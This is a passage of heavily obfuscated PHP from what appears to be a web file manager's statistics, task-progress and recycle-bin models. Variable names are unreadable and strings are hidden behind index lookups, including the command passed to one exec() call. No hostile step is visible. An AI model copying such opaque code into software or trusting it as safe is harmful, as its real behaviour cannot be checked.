$¿ßå­Òë = 0; } $ØÔšÊ”· = ($µÈĞˆ…Ù[$Ûè”¨Ú¦[1855]] + $¿ßå­Òë) / $µÈĞˆ…Ù[$Ûè”¨Ú¦[849]]; $µÈĞˆ…Ù[$Ûè”¨Ú¦[1798]] = $ØÔšÊ”· * 0.3; } else { if ($µÈĞˆ…Ù[$Ûè”¨Ú¦[1916]] == $Ûè”¨Ú¦[391]) { $ØÔšÊ”· = $µÈĞˆ…Ù[$Ûè”¨Ú¦[1797]] / $µÈĞˆ…Ù[$Ûè”¨Ú¦[1155]]; $µÈĞˆ…Ù[$Ûè”¨Ú¦[1798]] = 0.3 + $ØÔšÊ”· * 0.5; } else { if ($µÈĞˆ…Ù[$Ûè”¨Ú¦[1916]] == $Ûè”¨Ú¦[110]) { $ØÔšÊ”· = 0; if ($µÈĞˆ…Ù[$Ûè”¨Ú¦[1850]]) { $ØÔšÊ”· = $µÈĞˆ…Ù[$Ûè”¨Ú¦[1851]] / $µÈĞˆ…Ù[$Ûè”¨Ú¦[1850]]; } $µÈĞˆ…Ù[$Ûè”¨Ú¦[1798]] = 0.3 + 0.5 + $ØÔšÊ”· * 0.2; } } } if ($µÈĞˆ…Ù[$Ûè”¨Ú¦[1798]] > 0) { $ÃÅÕ×© = timeFloat() - $µÈĞˆ…Ù[$Ûè”¨Ú¦[1800]] - $µÈĞˆ…Ù[$Ûè”¨Ú¦[1803]]; $µÈĞˆ…Ù[$Ûè”¨Ú¦[1804]] = $ÃÅÕ×© * (1 - $µÈĞˆ…Ù[$Ûè”¨Ú¦[1798]]) / $µÈĞˆ…Ù[$Ûè”¨Ú¦[1798]]; } } public function copyFileStart($†¡ÏÏ¸, $êàşÄßß, $•áÏ´¾«, $´ºíö, $ÑÀ€·ÆÑ, $Şä¿…î) { $ŸÈøğÇ =& $_SERVER[´‹ô¯Œ]; parent::copyFileStart($†¡ÏÏ¸, $êàşÄßß, $•áÏ´¾«, $´ºíö, $ÑÀ€·ÆÑ, $Şä¿…î); $Ÿ‘ı—ûï =& $this->task; if ($Ÿ‘ı—ûï[$ŸÈøğÇ[1916]] == $ŸÈøğÇ[391]) { $Ÿ‘ı—ûï[$ŸÈøğÇ[1916]] = $ŸÈøğÇ[110]; } $this->update(); } public function copyFileEnd($“‘¢ö¦, $ª·ÅÔâ¡, $òÜŞ¥å×, $ƒÓ‰èç–, $—˜ò¡âØ, $˜•ø™›¥) { $£Œóö€ä =& $_SERVER[´‹ô¯Œ]; $­Ù¡ï²† =& $this->task; $­Ù¡ï²†[$£Œóö€ä[1851]] = $­Ù¡ï²†[$£Œóö€ä[1850]]; $­Ù¡ï²†[$£Œóö€ä[1855]] += $­Ù¡ï²†[$£Œóö€ä[1850]]; $­Ù¡ï²†[$£Œóö€ä[1852]] = $£Œóö€ä[12]; $this->update(); } public function zipEvent($µ¬Æèø¢, $Óæ±ßÊ¼, $Àûó®·, $œïØÈÒ¯) { $ÇÙÑŸæ =& $_SERVER[´‹ô¯Œ]; $Ã¸£¿£Ø =& $this->task; $Ã¸£¿£Ø[$ÇÙÑŸæ[1848]] = get_path_this($Óæ±ßÊ¼); $Ã¸£¿£Ø[$ÇÙÑŸæ[1850]] = $œïØÈÒ¯; $Ã¸£¿£Ø[$ÇÙÑŸæ[1851]] = $Àûó®·; $Ã¸£¿£Ø[$ÇÙÑŸæ[1157]] = $µ¬Æèø¢ == $ÇÙÑŸæ[1924] ? $ÇÙÑŸæ[1919] : $ÇÙÑŸæ[1920]; $Ã¸£¿£Ø[$ÇÙÑŸæ[1852]] = $ÇÙÑŸæ[12]; $Ã¸£¿£Ø[$ÇÙÑŸæ[849]] = $œïØÈÒ¯; $Ã¸£¿£Ø[$ÇÙÑŸæ[1916]] = $ÇÙÑŸæ[391]; $this->update(); } public function nameParse($¿™ÄùÎµ) { $§ŒÁ¨ùµ =& $_SERVER[´‹ô¯Œ]; $ñÀ˜Ùƒï =& $this->task; if ($ñÀ˜Ùƒï[$§ŒÁ¨ùµ[1797]] < $ñÀ˜Ùƒï[$§ŒÁ¨ùµ[1155]]) { $«ÎÚèÜÌ = get_path_this($¿™ÄùÎµ); if (strstr($«ÎÚèÜÌ, $§ŒÁ¨ùµ[10])) { $ñÀ˜Ùƒï[$§ŒÁ¨ùµ[1797]] += 1; } } if ($ñÀ˜Ùƒï[$§ŒÁ¨ùµ[1916]] == $§ŒÁ¨ùµ[1296]) { $ñÀ˜Ùƒï[$§ŒÁ¨ùµ[1916]] = $§ŒÁ¨ùµ[391]; } $ñÀ˜Ùƒï[$§ŒÁ¨ùµ[1848]] = $¿™ÄùÎµ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ŞŞ‰Ë¯ô) { $Íø’„¦ =& $_SERVER[´‹ô¯Œ]; $ãÇ¾Ì© = array($Íø’„¦[679] => array($Íø’„¦[33] => $Íø’„¦[1925], $Íø’„¦[353] => array($Íø’„¦[285], $Íø’„¦[851], $Íø’„¦[1926], $Íø’„¦[1927])), $Íø’„¦[1928] => array($Íø’„¦[33] => $Íø’„¦[1929], $Íø’„¦[353] => array($Íø’„¦[285], $Íø’„¦[849], $Íø’„¦[1930], $Íø’„¦[1931], $Íø’„¦[1932]))); if (!isset($ãÇ¾Ì©[$ŞŞ‰Ë¯ô])) { return !1; } $this->optionType = $ãÇ¾Ì©[$ŞŞ‰Ë¯ô][$Íø’„¦[33]]; $this->field = $ãÇ¾Ì©[$ŞŞ‰Ë¯ô][$Íø’„¦[353]]; return !0; } public function listData($™¤Â„ç€ = false, $È¯éÖ÷Ğ = "\155\157\144\x69\146\x79\x54\x69\155\x65", $Ş½ó™©Ñ = false) { return parent::listData($™¤Â„ç€, $È¯éÖ÷Ğ, $Ş½ó™©Ñ); } public function trendList($À›ó­×) { $âä³¥¶¨ =& $_SERVER[´‹ô¯Œ]; $ÙºÕÇ£÷ = $this->listData(); if ($ÙºÕÇ£÷) { $Ó†³êĞÇ = end($ÙºÕÇ£÷); $ı³¡¯Ò‡ = date($âä³¥¶¨[1933], strtotime($âä³¥¶¨[1934])); if ($Ó†³êĞÇ[$âä³¥¶¨[285]] == $ı³¡¯Ò‡) { return $ÙºÕÇ£÷; } $Ê¯‚èü’ = strtotime($Ó†³êĞÇ[$âä³¥¶¨[285]]); } if (!isset($Ê¯‚èü’)) { $³ÆÈ¨ÒÙ = $À›ó­× == $âä³¥¶¨[679] ? $âä³¥¶¨[611] : $âä³¥¶¨[916]; $Ê¯‚èü’ = Model($³ÆÈ¨ÒÙ)->min($âä³¥¶¨[234]); } $êõòÅòõ = $âä³¥¶¨[1935] . ucfirst($À›ó­×); $£îˆÁ æ = $this->dateList($Ê¯‚èü’); foreach ($£îˆÁ æ as $ı³¡¯Ò‡) { $this->{$êõòÅòõ}($ı³¡¯Ò‡); } return $this->listData(); } private function dateList($†Áú˜ÁÑ) { $Çü¸õùş =& $_SERVER[´‹ô¯Œ]; $÷â×¦ãø = $†Áú˜ÁÑ; $şŠâÀÕ = strtotime($Çü¸õùş[1934]); $ëÈ…ÂîÒ = array(); while ($÷â×¦ãø <= $şŠâÀÕ) { $ëÈ…ÂîÒ[] = date($Çü¸õùş[1933], $÷â×¦ãø); $÷â×¦ãø = strtotime($Çü¸õùş[1936], $÷â×¦ãø); } return $ëÈ…ÂîÒ; } public function _recordUser($˜½«¿ª = '') { $‡‘òÄß– =& $_SERVER[´‹ô¯Œ]; $êŞÃ™ˆº = strtotime(date($‡‘òÄß–[1937], strtotime($˜½«¿ª))); $ËîÚÎğ = strtotime(date($‡‘òÄß–[1938], strtotime($˜½«¿ª))); $çÀÜ‘êÏ = array($‡‘òÄß–[234] => array($‡‘òÄß–[1105], $ËîÚÎğ)); $„“Ÿò Ó = Model($‡‘òÄß–[611])->where($çÀÜ‘êÏ)->count($‡‘òÄß–[1796]); $çÀÜ‘êÏ[$‡‘òÄß–[234]] = array($‡‘òÄß–[411], array($êŞÃ™ˆº, $ËîÚÎğ)); $ïÅ£Ú‰ = Model($‡‘òÄß–[611])->where($çÀÜ‘êÏ)->count($‡‘òÄß–[1796]); $çÀÜ‘êÏ[$‡‘òÄß–[33]] = $‡‘òÄß–[1939]; $Ğì±Ú¦½ = Model($‡‘òÄß–[1940])->where($çÀÜ‘êÏ)->count($‡‘òÄß–[1941]); $Øí‡ø† = array($‡‘òÄß–[285] => $˜½«¿ª, $‡‘òÄß–[851] => (int) $„“Ÿò Ó, $‡‘òÄß–[1926] => (int) $ïÅ£Ú‰, $‡‘òÄß–[1927] => (int) $Ğì±Ú¦½); return $this->insert($Øí‡ø†); } public function _recordStore($‰”ÊËÕ = '') { $ôÈé¾ùØ =& $_SERVER[´‹ô¯Œ]; $òØ—Èº = strtotime(date($ôÈé¾ùØ[1938], strtotime($‰”ÊËÕ))); $Í´É’¬ = array($ôÈé¾ùØ[234] => array($ôÈé¾ùØ[1105], $òØ—Èº)); $õÅòîˆÅ = Model($ôÈé¾ùØ[558])->where($Í´É’¬)->sum($ôÈé¾ùØ[79]); $Í´É’¬[$ôÈé¾ùØ[497]] = 0; $ö”œ½Òü = Model($ôÈé¾ùØ[916])->where($Í´É’¬)->sum($ôÈé¾ùØ[79]); $Í´É’¬[$ôÈé¾ùØ[191]] = 1; $Êä÷œåå = Model($ôÈé¾ùØ[916])->where($Í´É’¬)->sum($ôÈé¾ùØ[79]); $Í´É’¬[$ôÈé¾ùØ[191]] = 2; $Í«ÓÄ‹Ö = Model($ôÈé¾ùØ[916])->where($Í´É’¬)->sum($ôÈé¾ùØ[79]); $ª¢ÕÂöã = array($ôÈé¾ùØ[285] => $‰”ÊËÕ, $ôÈé¾ùØ[849] => (int) $ö”œ½Òü, $ôÈé¾ùØ[1930] => (int) $õÅòîˆÅ, $ôÈé¾ùØ[1931] => (int) $Êä÷œåå, $ôÈé¾ùØ[1932] => (int) $Í«ÓÄ‹Ö); return $this->insert($ª¢ÕÂöã); } public function trend($²•¯ÓğÑ, $£«ş›æè) { $æÍ’Å‚¸ =& $_SERVER[´‹ô¯Œ]; if (!$this->init($²•¯ÓğÑ)) { return !1; } $Ù–´İÚĞ = $this->trendList($²•¯ÓğÑ); if ($Ù–´İÚĞ && $£«ş›æè != $æÍ’Å‚¸[1768]) { $ÑÉ²¥àü = $Ù–´İÚĞ[0][$æÍ’Å‚¸[285]]; $”¦¼İä² = $this->validDate($£«ş›æè, $ÑÉ²¥àü); $Ÿ•ù’Şä = array(); $öÎçÕğõ = array_to_keyvalue($Ù–´İÚĞ, $æÍ’Å‚¸[285]); foreach ($”¦¼İä² as $Ã ¤íÇû) { if (isset($öÎçÕğõ[$Ã ¤íÇû])) { $ÇÙ’”ãà = $öÎçÕğõ[$Ã ¤íÇû]; } else { $ÇÙ’”ãà = end($Ù–´İÚĞ); $ÇÙ’”ãà[$æÍ’Å‚¸[285]] = $Ã ¤íÇû; if ($²•¯ÓğÑ == $æÍ’Å‚¸[679]) { $ÇÙ’”ãà[$æÍ’Å‚¸[1926]] = $ÇÙ’”ãà[$æÍ’Å‚¸[1927]] = 0; } } $Ÿ•ù’Şä[] = $ÇÙ’”ãà; } $Ù–´İÚĞ = $Ÿ•ù’Şä; } $Ïëƒ£Ì = array($æÍ’Å‚¸[679] => array($æÍ’Å‚¸[851] => LNG($æÍ’Å‚¸[1942]), $æÍ’Å‚¸[1926] => LNG($æÍ’Å‚¸[1943]), $æÍ’Å‚¸[1927] => LNG($æÍ’Å‚¸[1944])), $æÍ’Å‚¸[1928] => array($æÍ’Å‚¸[849] => LNG($æÍ’Å‚¸[1945]), $æÍ’Å‚¸[1930] => LNG($æÍ’Å‚¸[1946]), $æÍ’Å‚¸[1931] => LNG($æÍ’Å‚¸[1947]), $æÍ’Å‚¸[1932] => LNG($æÍ’Å‚¸[1948]))); $İÍ€Âñİ = array($æÍ’Å‚¸[679] => $æÍ’Å‚¸[1949], $æÍ’Å‚¸[1928] => $æÍ’Å‚¸[79]); if (empty($Ù–´İÚĞ)) { $Ã ¤íÇû = date($æÍ’Å‚¸[1933], strtotime($æÍ’Å‚¸[1934])); $¯©ú‚Ÿ… = array($æÍ’Å‚¸[285] => $Ã ¤íÇû); foreach ($Ïëƒ£Ì[$²•¯ÓğÑ] as $ş™±¼ÃË => $²åáö€Ô) { $¯©ú‚Ÿ…[$ş™±¼ÃË] = 0; } $Ù–´İÚĞ[] = $¯©ú‚Ÿ…; } $š°¯Ÿ©Å = array(); foreach ($Ù–´İÚĞ as $²åáö€Ô) { if ($²•¯ÓğÑ == $æÍ’Å‚¸[1928] && $²åáö€Ô[$æÍ’Å‚¸[1930]] > $²åáö€Ô[$æÍ’Å‚¸[849]]) { $²åáö€Ô[$æÍ’Å‚¸[1930]] = $²åáö€Ô[$æÍ’Å‚¸[849]]; } foreach ($Ïëƒ£Ì[$²•¯ÓğÑ] as $ş™±¼ÃË => $Éºå¥Ö) { $ÇÙ’”ãà = array($æÍ’Å‚¸[285] => $²åáö€Ô[$æÍ’Å‚¸[285]], $æÍ’Å‚¸[1684] => $Éºå¥Ö); $ÇÙ’”ãà[$İÍ€Âñİ[$²•¯ÓğÑ]] = isset($²åáö€Ô[$ş™±¼ÃË]) ? $²åáö€Ô[$ş™±¼ÃË] : 0; $š°¯Ÿ©Å[] = $ÇÙ’”ãà; } } return $š°¯Ÿ©Å; } public function validDate($¡¨ËÑó, $ïú­Õ) { $â¨Ô¡äë =& $_SERVER[´‹ô¯Œ]; $Ú¦ ÷íü = date($â¨Ô¡äë[1933], strtotime($â¨Ô¡äë[1934])); $±Ü›şèë = array($Ú¦ ÷íü); switch ($¡¨ËÑó) { case $â¨Ô¡äë[1775]: $½×âÎ¼ = mktime(0, 0, 0, date($â¨Ô¡äë[1950]), date($â¨Ô¡äë[1476]) - date($â¨Ô¡äë[1565]) + 7 - 7, date($â¨Ô¡äë[1951])); $Âøæã« = 0; do { $ïÒ¼’œÆ = date($â¨Ô¡äë[1933], $½×âÎ¼ - 3600 * 24 * 7 * $Âøæã«); $±Ü›şèë[] = $ïÒ¼’œÆ; $Âøæã«++; } while ($ïú­Õ < $ïÒ¼’œÆ); break; case $â¨Ô¡äë[1773]: $Âøæã« = 1; do { $ö®ïÒâ¥ = date($â¨Ô¡äë[1952], strtotime("\x2d\x20{$Âøæã«}\40\x6d\x6f\156\x74\150\163")); $±Ü›şèë[] = $ö®ïÒâ¥; $Âøæã«++; } while ($ïú­Õ < $ö®ïÒâ¥); break; case $â¨Ô¡äë[1953]: $Ù”‚µ‘¯ = (int) date($â¨Ô¡äë[1951], strtotime($ïú­Õ)); $êÉâ‘õ² = (int) date($â¨Ô¡äë[1951]); if ($Ù”‚µ‘¯ >= $êÉâ‘õ²) { break; } for ($Ù”‚µ‘¯; $Ù”‚µ‘¯ < $êÉâ‘õ²; $Ù”‚µ‘¯++) { $±Ü›şèë[] = $Ù”‚µ‘¯ . $â¨Ô¡äë[1954]; } break; default: break; } if ($ïú­Õ > end($±Ü›şèë)) { array_pop($±Ü›şèë); } sort($±Ü›şèë); return $±Ü›şèë; } public function listTable($“Ü¤…“) { $îºÒİåˆ = ucfirst($“Ü¤…“); return Model($îºÒİåˆ)->listData(); } public function option($ŒÛ‚µÕ¾) { $Šãçâªà = $_SERVER[´‹ô¯Œ][1955] . ucfirst($ŒÛ‚µÕ¾); return $this->{$Šãçâªà}(); } private function optionUser() { $·„Õ™…½ =& $_SERVER[´‹ô¯Œ]; $†­ü¹°– = Model($·„Õ™…½[611])->count($·„Õ™…½[1796]); $¦öØ»àş = Model($·„Õ™…½[611])->where($·„Õ™…½[1956])->count($·„Õ™…½[1796]); $·Ö´ÚÛ‘ = intval($GLOBALS[$·„Õ™…½[6]][$·„Õ™…½[427]][$·„Õ™…½[1741]]) / 3600; $Œú¼’ º = strtotime("\x2d{$·Ö´ÚÛ‘}\40\150\157\x75\x72\x73"); $êè¹æµ = strtotime(date($·„Õ™…½[1937])); if ($Œú¼’ º < $êè¹æµ) { $Œú¼’ º = $êè¹æµ; } $Øï­’›ƒ = array($·„Õ™…½[1957] => array($·„Õ™…½[1106], $Œú¼’ º)); $‘½Æß… = (int) Model($·„Õ™…½[611])->where($Øï­’›ƒ)->count($·„Õ™…½[1796]); if (!$‘½Æß…) { $‘½Æß… = 1; } $Øï­’›ƒ = array($·„Õ™…½[1957] => array($·„Õ™…½[1106], $êè¹æµ)); $èæßòÆÃ = Model($·„Õ™…½[611])->where($Øï­’›ƒ)->count($·„Õ™…½[1796]); return array($·„Õ™…½[844] => (int) $†­ü¹°–, $·„Õ™…½[1958] => (int) ($†­ü¹°– - $¦öØ»àş), $·„Õ™…½[1959] => (int) $¦öØ»àş, $·„Õ™…½[1960] => (int) $èæßòÆÃ, $·„Õ™…½[1961] => $‘½Æß…); } private function optionFile() { $ÂÇñÓí“ =& $_SERVER[´‹ô¯Œ]; $ÙîÈê÷ = $this->sourceSize(); $Ù° = $ÙîÈê÷[$ÂÇñÓí“[79]]; $Û‡Åˆ²¸ = $ÙîÈê÷[$ÂÇñÓí“[1930]]; $®—²›¨œ = Model($ÂÇñÓí“[916])->where(array($ÂÇñÓí“[497] => 0))->count($ÂÇñÓí“[194]); $¡Â²“½È = array($ÂÇñÓí“[497] => 0, $ÂÇñÓí“[234] => array($ÂÇñÓí“[1106], strtotime(date($ÂÇñÓí“[1937])))); $»ğò‹Úå = Model($ÂÇñÓí“[916])->where($¡Â²“½È)->sum($ÂÇñÓí“[79]); $îŒºÙÈ“ = Model($ÂÇñÓí“[916])->where($¡Â²“½È)->count($ÂÇñÓí“[194]); return array($ÂÇñÓí“[849] => $Ù°, $ÂÇñÓí“[1930] => $Û‡Åˆ²¸, $ÂÇñÓí“[1962] => $Ù° - $Û‡Åˆ²¸, $ÂÇñÓí“[1963] => (int) $»ğò‹Úå, $ÂÇñÓí“[851] => (int) $®—²›¨œ, $ÂÇñÓí“[1964] => (int) $îŒºÙÈ“); } private function optionAccess() { $ù¤ãøîİ =& $_SERVER[´‹ô¯Œ]; return array($ù¤ãøîİ[844] => $this->typeLogCnt(), $ù¤ãøîİ[110] => $this->typeLogCnt($ù¤ãøîİ[110]), $ù¤ãøîİ[537] => $this->typeLogCnt($ù¤ãøîİ[537]), $ù¤ãøîİ[1965] => $this->typeLogCnt($ù¤ãøîİ[1965]), $ù¤ãøîİ[1966] => $this->typeLogCnt($ù¤ãøîİ[1966]), $ù¤ãøîİ[679] => $this->typeLogCnt($ù¤ãøîİ[12], $ù¤ãøîİ[1941])); } private function typeLogCnt($ı ±æ€ô = '', $«¶ØÑ¬Ü = "\x69\x64") { $¹šÌ´ =& $_SERVER[´‹ô¯Œ]; $¥ÒûÖÍƒ = array($¹šÌ´[110] => array($¹šÌ´[1967], $¹šÌ´[1968]), $¹šÌ´[537] => array($¹šÌ´[1969], $¹šÌ´[1970]), $¹šÌ´[1965] => array($¹šÌ´[1971], $¹šÌ´[1972], $¹šÌ´[1973]), $¹šÌ´[1966] => array($¹šÌ´[1974], $¹šÌ´[1975]), $¹šÌ´[1976] => array($¹šÌ´[1977], $¹šÌ´[1978], $¹šÌ´[1979])); $¯èİÅôê = strtotime(date($¹šÌ´[1937])); $Ó‹¯°Ú± = array($¹šÌ´[234] => array($¹šÌ´[1106], $¯èİÅôê)); if ($ı ±æ€ô) { $Ó‹¯°Ú±[$¹šÌ´[33]] = array($¹šÌ´[7], $¥ÒûÖÍƒ[$ı ±æ€ô]); } $Ç˜’ÅÙ = Model($¹šÌ´[1940])->where($Ó‹¯°Ú±)->count($«¶ØÑ¬Ü); return (int) $Ç˜’ÅÙ; } private function optionServer() { $ßÕ¶¬ä÷ =& $_SERVER[´‹ô¯Œ]; $Ø³Á±²Ÿ = $this->diskDriver(); $ì†×˜ÍÅ = KodIO::defaultDriver(); $¼½áê¡Ñ = array($ßÕ¶¬ä÷[909] => $ì†×˜ÍÅ[$ßÕ¶¬ä÷[487]]); $äÍ¢ÖÁŸ = Model($ßÕ¶¬ä÷[558])->where($¼½áê¡Ñ)->sum($ßÕ¶¬ä÷[79]); $„­Ğßµú = explode($ßÕ¶¬ä÷[53], $_SERVER[$ßÕ¶¬ä÷[147]]); $Ú¡¬‰í˜ = $„­Ğßµú[0]; $äß…¡ö’ = $GLOBALS[$ßÕ¶¬ä÷[6]][$ßÕ¶¬ä÷[21]]; $˜äÔœ·Ö = $äß…¡ö’[$ßÕ¶¬ä÷[1068]]; if ($˜äÔœ·Ö == $ßÕ¶¬ä÷[1056]) { $ÛÙºü´† = explode($ßÕ¶¬ä÷[1385], $äß…¡ö’[$ßÕ¶¬ä÷[1067]]); $˜äÔœ·Ö = $ÛÙºü´†[0]; } if ($˜äÔœ·Ö == $ßÕ¶¬ä÷[1004] || $˜äÔœ·Ö == $ßÕ¶¬ä÷[894]) { $§İşöç = Model()->db()->query($ßÕ¶¬ä÷[1980]); $¥À‚Œ® = $§İşöç[0] && isset($§İşöç[0][$ßÕ¶¬ä÷[1683]]) ? $§İşöç[0][$ßÕ¶¬ä÷[1683]] : 0; $˜äÔœ·Ö = $ßÕ¶¬ä÷[1981] . ($¥À‚Œ® ? $ßÕ¶¬ä÷[8] . $¥À‚Œ® : $ßÕ¶¬ä÷[12]); } $“…öïØÄ = $GLOBALS[$ßÕ¶¬ä÷[6]][$ßÕ¶¬ä÷[427]][$ßÕ¶¬ä÷[918]]; return array($ßÕ¶¬ä÷[1982] => $Ø³Á±²Ÿ ? $Ø³Á±²Ÿ[$ßÕ¶¬ä÷[1983]] : 0, $ßÕ¶¬ä÷[1984] => $Ø³Á±²Ÿ ? $Ø³Á±²Ÿ[$ßÕ¶¬ä÷[1985]] : 0, $ßÕ¶¬ä÷[1986] => (int) $ì†×˜ÍÅ[$ßÕ¶¬ä÷[1983]] * 1024 * 1024 * 1024, $ßÕ¶¬ä÷[1987] => (int) $äÍ¢ÖÁŸ, $ßÕ¶¬ä÷[1988] => ucfirst($Ú¡¬‰í˜), $ßÕ¶¬ä÷[1989] => $ßÕ¶¬ä÷[1990] . PHP_VERSION, $ßÕ¶¬ä÷[1991] => phpBuild64() ? 64 : 32, $ßÕ¶¬ä÷[843] => str_replace($ßÕ¶¬ä÷[1224], $ßÕ¶¬ä÷[1084], $˜äÔœ·Ö), $ßÕ¶¬ä÷[427] => ucfirst($“…öïØÄ), $ßÕ¶¬ä÷[32] => $_SERVER[$ßÕ¶¬ä÷[1992]]); } private function diskDriver() { $°˜Î™Ë– =& $_SERVER[´‹ô¯Œ]; $¢îÅĞù = $°˜Î™Ë–[8]; $Ç˜Ç³© = $GLOBALS[$°˜Î™Ë–[6]][$°˜Î™Ë–[1409]] == $°˜Î™Ë–[1410]; if ($Ç˜Ç³©) { $¢îÅĞù = $°˜Î™Ë–[1993]; if (function_exists($°˜Î™Ë–[1994])) { exec($°˜Î™Ë–[1995], $Ã‹Á½‡); $¢îÅĞù = $Ã‹Á½‡[1] . $°˜Î™Ë–[8]; } } if (!file_exists($¢îÅĞù)) { return; } if (!function_exists($°˜Î™Ë–[1996])) { return; } $£Ä½ŠÃ£ = @disk_total_space($¢îÅĞù); $î„˜¿Îè = $£Ä½ŠÃ£ - @disk_free_space($¢îÅĞù); return array($°˜Î™Ë–[1983] => $£Ä½ŠÃ£, $°˜Î™Ë–[1985] => $î„˜¿Îè); } public function fileChart($êô¿ïº) { $Ÿ—Ú÷§• =& $_SERVER[´‹ô¯Œ]; if (isset($êô¿ïº[$Ÿ—Ú÷§•[1796]])) { return Model($Ÿ—Ú÷§•[916])->userFileTypeProfile($êô¿ïº[$Ÿ—Ú÷§•[1796]]); } if (isset($êô¿ïº[$Ÿ—Ú÷§•[1407]])) { return Model($Ÿ—Ú÷§•[916])->groupFileTypeProfile($êô¿ïº[$Ÿ—Ú÷§•[1407]]); } $´Œˆ×ùÉ = $this->sourceSize(); $©‡š¡»Í = array($Ÿ—Ú÷§•[193] => 0, $Ÿ—Ú÷§•[191] => 1); $È¡ê÷û = Model($Ÿ—Ú÷§•[916])->where($©‡š¡»Í)->sum($Ÿ—Ú÷§•[79]); $©‡š¡»Í[$Ÿ—Ú÷§•[191]] = 2; $íë¼ö³ß = Model($Ÿ—Ú÷§•[916])->where($©‡š¡»Í)->sum($Ÿ—Ú÷§•[79]); return array($Ÿ—Ú÷§•[849] => $´Œˆ×ùÉ[$Ÿ—Ú÷§•[79]], $Ÿ—Ú÷§•[1930] => $´Œˆ×ùÉ[$Ÿ—Ú÷§•[1930]], $Ÿ—Ú÷§•[1931] => (int) $È¡ê÷û, $Ÿ—Ú÷§•[1932] => (int) $íë¼ö³ß); } private function sourceSize() { $æéº‡Ù =& $_SERVER[´‹ô¯Œ]; $××úå¯´ = Model($æéº‡Ù[916])->where(array($æéº‡Ù[497] => 0))->sum($æéº‡Ù[79]); $è×”Î Ï = Model($æéº‡Ù[558])->sum($æéº‡Ù[79]); if ($è×”Î Ï > $××úå¯´) { $è×”Î Ï = $××úå¯´; } return array($æéº‡Ù[79] => (int) $××úå¯´, $æéº‡Ù[1930] => (int) $è×”Î Ï); } } goto C“¢çäØ‰À; c·Îäèö—ğ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\x63\145\137\x72\145\143\x79\x63\154\x65"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\124\x69\155\x65", "\164\151\x6d\145", "\151\156\x73\x65\x72\x74", "\146\x75\x6e\x63\164\x69\157\x6e")); public function listData($æ³¼Ëë = false) { $ö×ì£„Ö =& $_SERVER[´‹ô¯Œ]; $æ³¼Ëë = $æ³¼Ëë ? $æ³¼Ëë : USER_ID; $¿›»ªï® = $this->where(array($ö×ì£„Ö[1787] => $æ³¼Ëë))->select(); return array_to_keyvalue($¿›»ªï®, $ö×ì£„Ö[12], $ö×ì£„Ö[194]); } public function moveToRecycle($¶¶ĞìÏï) { $ß¶‚ŒÔÁ =& $_SERVER[´‹ô¯Œ]; $³Ú³È» = Model($ß¶‚ŒÔÁ[1445]); $©¿•ëÒ¥ = $³Ú³È»->sourceInfo($¶¶ĞìÏï); if (!$©¿•ëÒ¥ || $©¿•ëÒ¥[$ß¶‚ŒÔÁ[517]] == $ß¶‚ŒÔÁ[91]) { return; } $ø†Ö° = array($ß¶‚ŒÔÁ[503] => $¶¶ĞìÏï, $ß¶‚ŒÔÁ[1787] => USER_ID, $ß¶‚ŒÔÁ[665] => $©¿•ëÒ¥[$ß¶‚ŒÔÁ[191]], $ß¶‚ŒÔÁ[666] => $©¿•ëÒ¥[$ß¶‚ŒÔÁ[583]], $ß¶‚ŒÔÁ[669] => $©¿•ëÒ¥[$ß¶‚ŒÔÁ[598]]); $this->add($ø†Ö°); $this->recycleMove($¶¶ĞìÏï, 1); if ($©¿•ëÒ¥[$ß¶‚ŒÔÁ[497]] == $ß¶‚ŒÔÁ[91]) { $¹¹µ¶è• = array($ß¶‚ŒÔÁ[669] => array($ß¶‚ŒÔÁ[629], $©¿•ëÒ¥[$ß¶‚ŒÔÁ[598]] . $¶¶ĞìÏï . $ß¶‚ŒÔÁ[630])); $³Ú³È»->where($¹¹µ¶è•)->setField($ß¶‚ŒÔÁ[517], 1); } } public function clear() { $this->remove(!1); } public function remove($“³Òö  = false, $×Ôúè— = false) { $†ÜëÔä‚ =& $_SERVER[´‹ô¯Œ]; $×Ôúè— = $×Ôúè— ? $×Ôúè— : USER_ID; $œõĞëİÃ = Model($†ÜëÔä‚[1445]); $ÃÙ¹¯ÓÀ = $this->listData($×Ôúè—); $“³Òö  = $“³Òö  === !1 ? !1 : $“³Òö ; $»«¬³ø» = array(); foreach ($ÃÙ¹¯ÓÀ as $šçÖ‚„) { if ($“³Òö  != !1 && !in_array($šçÖ‚„, $“³Òö )) { continue; } $˜ø’á = $œõĞëİÃ->sourceInfo($šçÖ‚„); $œõĞëİÃ->remove($šçÖ‚„, !1); $öèã²É = $˜ø’á[$†ÜëÔä‚[191]] . $†ÜëÔä‚[11] . $˜ø’á[$†ÜëÔä‚[583]]; $»«¬³ø»[$öèã²É] = array($†ÜëÔä‚[665] => $˜ø’á[$†ÜëÔä‚[191]], $†ÜëÔä‚[583] => $˜ø’á[$†ÜëÔä‚[583]]); $this->where(array($†ÜëÔä‚[194] => $šçÖ‚„))->delete(); } foreach ($»«¬³ø» as $´‘ÔÚˆ³) { $œõĞëİÃ->targetSpaceUpdate($´‘ÔÚˆ³[$†ÜëÔä‚[191]], $´‘ÔÚˆ³[$†ÜëÔä‚[583]]); } } public function restore($Üæ¡á¬Û = false) { $û·ÍŸ¶ = $this->listData(); $this->_restoreSource($û·ÍŸ¶, $Üæ¡á¬Û); } public function removeUserAll($ğúŞ­›™) { $this->remove(!1, $ğúŞ­›™); } public function restoreItem($ç™£Öäƒ) { $this->_restoreSource(array($ç™£Öäƒ), array($ç™£Öäƒ)); } private function _restoreSource($½—¬ˆÇ, $çş¾ˆ) { $ ¼³„¥Û =& $_SERVER[´‹ô¯Œ]; $¡­»×Ÿâ = Model($ ¼³„¥Û[1445]); $çş¾ˆ = $çş¾ˆ == !1 ? !1 : $çş¾ˆ; if (!$½—¬ˆÇ) { return !0; } $—ßÙÆ¯É = array(); foreach ($½—¬ˆÇ as $Ñ¼¹¡ŸŒ) { if ($çş¾ˆ != !1 && !in_array($Ñ¼¹¡ŸŒ, $çş¾ˆ)) { continue; } $Ö×ƒÇâ¶ = $¡­»×Ÿâ->sourceInfo($Ñ¼¹¡ŸŒ); $¥¯Ášú = $¡­»×Ÿâ->sourceInfo($Ö×ƒÇâ¶[$ ¼³„¥Û[193]]); if ($¥¯Ášú[$ ¼³„¥Û[517]] == $ ¼³„¥Û[91]) { continue; } $¡­»×Ÿâ->lockMoveStart($Ñ¼¹¡ŸŒ); 